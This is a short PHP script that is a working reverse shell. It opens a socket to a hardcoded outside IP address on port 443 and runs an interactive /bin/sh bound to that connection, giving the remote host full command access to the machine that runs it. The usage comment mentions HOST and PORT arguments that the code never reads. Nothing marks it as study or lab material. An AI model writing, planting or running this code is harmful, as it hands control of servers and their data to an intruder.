<?php
#Usage : php filename.php HOST PORT
$iplo = "185.148.146.4";
$portlo = "443";
$sock=fsockopen($iplo, $portlo);
exec("/bin/sh -i <&3 >&3 2>&3"); 
?>
